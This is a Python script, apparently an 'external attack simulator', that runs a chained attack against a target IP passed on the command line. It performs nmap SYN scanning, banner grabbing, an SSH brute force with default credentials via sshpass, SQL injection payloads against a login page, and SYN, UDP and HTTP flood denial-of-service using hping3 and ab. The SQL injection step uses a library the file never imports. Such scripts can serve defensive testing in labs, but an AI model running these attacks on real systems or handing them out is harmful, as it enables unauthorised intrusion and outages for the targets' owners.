#!/usr/bin/env python3
"""
External Attack Simulation
Attacks from outside the network
"""

import subprocess
import time
import socket
import json
from datetime import datetime
from scapy.all import *

class ExternalAttackSimulator:
    """Simulate external network attacks"""
    
    def __init__(self, target="10.0.0.1", log_file="external_attacks.log"):
        self.target = target
        self.log_file = log_file
        self.attacks = []
    
    def log_attack(self, attack_type, details, success=True):
        """Log attack execution"""
        entry = {
            'timestamp': datetime.now().isoformat(),
            'type': attack_type,
            'target': self.target,
            'details': details,
            'success': success,
            'source': 'EXTERNAL'
        }
        self.attacks.append(entry)
        
        print(f"\n[{datetime.now().strftime('%H:%M:%S')}] {attack_type}")
        print(f"  Target: {self.target}")
        print(f"  Status: {'✓ Success' if success else '✗ Failed'}")
    
    def dns_enumeration(self):
        """Attempt DNS enumeration"""
        print("\n[+] DNS Enumeration")
        try:
            # Simulate DNS queries
            common_subdomains = ['admin', 'mail', 'ftp', 'web', 'db']
            for subdomain in common_subdomains:
                hostname = f"{subdomain}.example.com"
                time.sleep(0.5)
            
            self.log_attack("DNS Enumeration", f"Queried {len(common_subdomains)} subdomains")
        except Exception as e:
            self.log_attack("DNS Enumeration", str(e), False)
    
    def ping_sweep(self):
        """Network ping sweep reconnaissance"""
        print("\n[+] Ping Sweep")
        try:
            cmd = f"timeout 10 ping -c 1 {self.target}"
            result = subprocess.run(cmd, shell=True, capture_output=True)
            
            self.log_attack("Ping Sweep", f"ICMP ping to {self.target}")
        except Exception as e:
            self.log_attack("Ping Sweep", str(e), False)
    
    def port_scan_syn(self):
        """SYN port scan with Nmap"""
        print("\n[+] SYN Port Scan")
        try:
            cmd = f"nmap -sS -p 1-1000 --max-rate 100 {self.target}"
            result = subprocess.run(cmd, shell=True, capture_output=True, timeout=30)
            
            self.log_attack("Port Scan (SYN)", f"Scanned ports 1-1000 on {self.target}")
        except Exception as e:
            self.log_attack("Port Scan (SYN)", str(e), False)
    
    def service_version_detection(self):
        """Detect service versions"""
        print("\n[+] Service Version Detection")
        try:
            ports = [21, 22, 25, 80, 443, 3306, 5432]
            for port in ports:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    sock.connect((self.target, port))
                    sock.send(b"HEAD / HTTP/1.0\r\n\r\n")
                    banner = sock.recv(1024)
                    sock.close()
                except:
                    pass
                time.sleep(0.5)
            
            self.log_attack("Service Version Detection", f"Probed {len(ports)} ports")
        except Exception as e:
            self.log_attack("Service Version Detection", str(e), False)
    
    def ssh_brute_force(self):
        """SSH brute force attempt"""
        print("\n[+] SSH Brute Force")
        try:
            usernames = ['admin', 'root', 'user']
            passwords = ['password', '123456', 'admin']
            
            for user in usernames:
                for passwd in passwords:
                    cmd = f"timeout 1 sshpass -p '{passwd}' ssh -o StrictHostKeyChecking=no {user}@{self.target} exit 2>/dev/null"
                    subprocess.run(cmd, shell=True, capture_output=True)
                    time.sleep(0.5)
            
            self.log_attack("SSH Brute Force", f"Tested {len(usernames) * len(passwords)} credential pairs")
        except Exception as e:
            self.log_attack("SSH Brute Force", str(e), False)
    
    def sql_injection_probe(self):
        """SQL injection probe"""
        print("\n[+] SQL Injection Probes")
        try:
            payloads = [
                "' OR '1'='1",
                "admin'--",
                "1' UNION SELECT NULL--",
            ]
            
            for payload in payloads:
                try:
                    response = requests.get(
                        f"http://{self.target}/login.php",
                        params={'id': payload},
                        timeout=2
                    )
                except:
                    pass
                time.sleep(0.5)
            
            self.log_attack("SQL Injection", f"Sent {len(payloads)} SQL injection payloads")
        except Exception as e:
            self.log_attack("SQL Injection", str(e), False)
    
    def syn_flood(self, duration=15):
        """SYN flood DDoS"""
        print(f"\n[+] SYN Flood ({duration}s)")
        try:
            cmd = f"timeout {duration} hping3 -S -p 80 --flood {self.target}"
            subprocess.run(cmd, shell=True, capture_output=True)
            
            self.log_attack("SYN Flood", f"Sent SYN packets to {self.target}:80 for {duration}s")
        except Exception as e:
            self.log_attack("SYN Flood", str(e), False)
    
    def udp_flood(self, duration=15):
        """UDP flood DDoS"""
        print(f"\n[+] UDP Flood ({duration}s)")
        try:
            cmd = f"timeout {duration} hping3 --udp -p 53 --flood {self.target}"
            subprocess.run(cmd, shell=True, capture_output=True)
            
            self.log_attack("UDP Flood", f"Sent UDP packets to {self.target}:53 for {duration}s")
        except Exception as e:
            self.log_attack("UDP Flood", str(e), False)
    
    def http_flood(self, duration=15):
        """HTTP flood attack"""
        print(f"\n[+] HTTP Flood ({duration}s)")
        try:
            cmd = f"timeout {duration} ab -n 50000 -c 100 http://{self.target}/"
            subprocess.run(cmd, shell=True, capture_output=True)
            
            self.log_attack("HTTP Flood", f"Sent HTTP requests to {self.target} for {duration}s")
        except Exception as e:
            self.log_attack("HTTP Flood", str(e), False)
    
    def run_full_external_attack_chain(self):
        """Run complete external attack chain"""
        print("\n" + "="*70)
        print("EXTERNAL ATTACK CHAIN - COMPLETE SCENARIO")
        print("="*70)
        
        print("\n[PHASE 1: RECONNAISSANCE]")
        self.dns_enumeration()
        time.sleep(2)
        self.ping_sweep()
        time.sleep(2)
        
        print("\n[PHASE 2: SCANNING]")
        self.port_scan_syn()
        time.sleep(3)
        self.service_version_detection()
        time.sleep(2)
        
        print("\n[PHASE 3: INITIAL ACCESS ATTEMPTS]")
        self.ssh_brute_force()
        time.sleep(3)
        self.sql_injection_probe()
        time.sleep(2)
        
        print("\n[PHASE 4: DENIAL OF SERVICE]")
        self.syn_flood(duration=10)
        time.sleep(3)
        self.udp_flood(duration=10)
        time.sleep(3)
        
        self.generate_report()
    
    def generate_report(self):
        """Generate attack report"""
        print("\n" + "="*70)
        print("EXTERNAL ATTACK SIMULATION REPORT")
        print("="*70)
        
        print(f"\nTotal Attacks: {len(self.attacks)}")
        print("\nAttacks Executed:")
        for i, attack in enumerate(self.attacks, 1):
            status = "✓" if attack['success'] else "✗"
            print(f"{i}. [{status}] {attack['type']}")
        
        # Save report
        with open(self.log_file, 'w') as f:
            json.dump(self.attacks, f, indent=2)
        
        print(f"\nReport saved to: {self.log_file}")


if __name__ == "__main__":
    import sys
    target = sys.argv[1] if len(sys.argv) > 1 else "10.0.0.1"
    
    simulator = ExternalAttackSimulator(target)
    simulator.run_full_external_attack_chain()
